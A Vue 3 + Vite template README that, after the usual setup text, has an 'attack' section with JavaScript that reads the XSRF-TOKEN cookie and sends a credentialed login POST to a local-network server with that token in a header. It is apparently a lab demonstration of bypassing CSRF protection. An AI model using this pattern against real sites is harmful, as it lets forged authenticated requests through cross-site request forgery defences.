# Vue 3 + Vite

This template should help get you started developing with Vue 3 in Vite. The template uses Vue 3 `<script setup>` SFCs, check out the [script setup docs](https://v3.vuejs.org/api/sfc-script-setup.html#sfc-script-setup) to learn more.

## Recommended IDE Setup

- [VSCode](https://code.visualstudio.com/) + [Volar](https://marketplace.visualstudio.com/items?itemName=johnsoncodehk.volar)

## attack

```
var token
var cookies = document.cookie
var cookiesSplit = cookies.split(": ")
for (var i in cookiesSplit) {
  var cookie = cookiesSplit[i]
  var cookieSplit = cookie.split("=")
  if (cookieSplit[0] === 'XSRF-TOKEN') {
    token = cookieSplit[1]
  }
}
console.log('从 Cookie 获取的 Token：', token)

var data = new FormData();
data.append("username", "xuxiaowei");
data.append("password", "123");

var xhr = new XMLHttpRequest();
xhr.withCredentials = true;

xhr.addEventListener("readystatechange", function() {
  if(this.readyState === 4) {
    console.log('登录结果：', this.responseText);
  }
});

xhr.open("POST", "http://192.168.5.3:8080/login");
xhr.setRequestHeader("X-XSRF-TOKEN", token);

xhr.send(data);
```
